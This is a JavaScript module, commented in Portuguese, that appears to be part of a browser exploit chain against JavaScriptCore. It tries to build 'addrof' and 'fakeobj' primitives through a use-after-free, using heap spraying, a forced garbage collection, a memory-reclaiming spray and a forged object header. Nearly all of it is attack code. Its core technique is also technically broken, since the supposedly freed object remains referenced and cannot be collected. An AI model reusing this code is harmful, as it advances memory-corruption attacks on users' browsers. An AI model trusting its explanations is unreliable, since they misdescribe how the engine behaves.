// js/script3/testArrayBufferVictimCrash.mjs (v82_AGL - R56 Corrigido)
// Foco: Criação de primitivas addrof e fakeobj estáveis via UAF.

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';

// Mantendo o nome do módulo para consistência com o orquestrador
export const FNAME_MODULE = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Annihilation";

// --- Variáveis Globais para as Primitivas ---
// Usamos variáveis no escopo do módulo para que as primitivas possam acessá-las
let structure_id_leaker;
let corrupted_array;

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R56 Corrigido)
// =======================================================================================
export async function runExploitChain_Final() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Foco em Primitivas Estáveis (R56 Corrigido) ---`, "test");

    try {
        // --- FASE 1: Construir Primitivas `addrof` e `fakeobj` via UAF ---
        logS3("--- FASE 1: Forjando a Chave-Mestra (addrof/fakeobj via UAF) ---", "subtest");
        const primitives = createUAFPrimitives();
        
        if (!primitives || !primitives.addrof || !primitives.fakeobj) {
            throw new Error("Não foi possível estabilizar as primitivas via UAF.");
        }
        logS3("    Primitivas `addrof` e `fakeobj` ESTÁVEIS construídas com sucesso!", "vuln");

        const { addrof, fakeobj } = primitives;

        // --- FASE 2: Prova de Vida das Primitivas ---
        logS3("--- FASE 2: Verificando a funcionalidade das primitivas ---", "subtest");

        // Teste `addrof`
        const test_obj = { a: 1, b: 2 };
        const test_obj_addr = addrof(test_obj);
        logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${test_obj_addr.toString(true)}`, "leak");
        if (test_obj_addr.low() === 0 && test_obj_addr.high() === 0) {
            throw new Error("`addrof` retornou um endereço nulo.");
        }

        // Teste `fakeobj`
        const fake_obj = fakeobj(test_obj_addr);
        logS3(`    Prova de Vida (fakeobj): Objeto falso criado no endereço vazado.`, "info");
        
        // Se conseguirmos ler a propriedade 'a' do objeto falso, a primitiva funciona.
        if (fake_obj.a === 1) {
            logS3(`    SUCESSO! Lemos a propriedade 'a' (valor: ${fake_obj.a}) do objeto falso. Primitivas validadas!`, "vuln");
        } else {
            throw new Error(`Falha ao validar 'fakeobj'. Esperado 'a=1', obtido 'a=${fake_obj.a}'.`);
        }

        document.title = "addrof/fakeobj SUCCESS!";
        return { success: true, message: "Primitivas addrof e fakeobj criadas e validadas com sucesso!" };

    } catch (e) {
        logS3(`A cadeia de exploração falhou: ${e.message}`, "critical");
        console.error(e);
        document.title = "Exploit Failed";
        return { success: false, errorOccurred: e.message };
    }
}

// --- Funções Primitivas UAF (o coração do exploit) ---

function createUAFPrimitives() {
    // 1. Prepara o palco com um spray de objetos
    let spray = [];
    for (let i = 0; i < 4096; i++) {
        // Objeto com uma estrutura específica que conhecemos
        let obj = { a: 1, b: 2 };
        spray.push(obj);
    }

    // 2. Cria o ponteiro pendurado (dangling pointer)
    let dangling_ref = spray[spray.length - 1];
    spray = null; // Libera a referência principal, tornando os objetos elegíveis para GC

    // 3. Força a Coleta de Lixo para liberar a memória
    triggerGC();
    
    // 4. Spray de Reclamação: Pulverizamos um tipo de objeto diferente (Array) para
    //    reclamar a memória do objeto liberado e causar a confusão de tipos.
    let reclaimers = [];
    for (let i = 0; i < 2048; i++) {
        reclaimers.push([1.1, 2.2, 3.3, 4.4]); // Arrays de float
    }

    // 5. Encontra a referência corrompida
    // 'dangling_ref' agora aponta para um Array, mas o sistema pensa que é um objeto {a, b}
    corrupted_array = dangling_ref;
    
    // A propriedade 'a' do objeto original agora se sobrepõe ao cabeçalho (JSCell) do array.
    // Lendo 'a', vazamos o cabeçalho como um double.
    const header_double = corrupted_array.a;
    const header_buf = new ArrayBuffer(8);
    (new Float64Array(header_buf))[0] = header_double;
    const header_ints = new Uint32Array(header_buf);
    
    // O cabeçalho contém o ID da estrutura do objeto. Nós o salvamos.
    structure_id_leaker = header_ints[0];
    logS3("    UAF bem-sucedido! Confusão de tipos estabelecida.", "good");

    // 6. Define as funções de primitiva
    const addrof = (obj) => {
        // Colocamos o objeto que queremos vazar na posição 0 do nosso array corrompido
        corrupted_array[0] = obj;
        // O JS ainda pensa que `corrupted_array` é um objeto {a, b}.
        // A propriedade 'b' agora se sobrepõe ao primeiro elemento do array.
        // Ler `corrupted_array.b` nos dá o endereço do objeto como um double.
        const addr_double = corrupted_array.b;
        
        const buf = new ArrayBuffer(8);
        (new Float64Array(buf))[0] = addr_double;
        const int_view = new Uint32Array(buf);
        return new AdvancedInt64(int_view[0], int_view[1]);
    };

    const fakeobj = (addr) => {
        // Convertemos o endereço desejado para um double
        const buf = new ArrayBuffer(8);
        (new Uint32Array(buf))[0] = addr.low();
        (new Uint32Array(buf))[1] = addr.high();
        const addr_double = (new Float64Array(buf))[0];

        // Escrevemos o endereço (como double) no primeiro elemento do array corrompido
        corrupted_array.b = addr_double;
        
        // O cabeçalho do array (acessado via `corrupted_array.a`) precisa ser restaurado
        // para que o sistema pense que o que está em `corrupted_array[0]` é um objeto válido.
        // Criamos um cabeçalho falso com o ID de estrutura que vazamos anteriormente.
        const fake_header_buf = new ArrayBuffer(8);
        const fake_header_view = new Uint32Array(fake_header_buf);
        fake_header_view[0] = structure_id_leaker; // ID da estrutura de um objeto
        fake_header_view[1] = 0x01000000; // JSCell header normal
        corrupted_array.a = (new Float64Array(fake_header_buf))[0];

        // Agora, `corrupted_array[0]` é o nosso objeto falso no endereço especificado.
        return corrupted_array[0];
    };

    return { addrof, fakeobj };
}

function triggerGC() {
    try {
        const arr = [];
        for (let i = 0; i < 4096; i++) {
            arr.push(new ArrayBuffer(1024 * 64));
        }
    } catch(e) {}
}
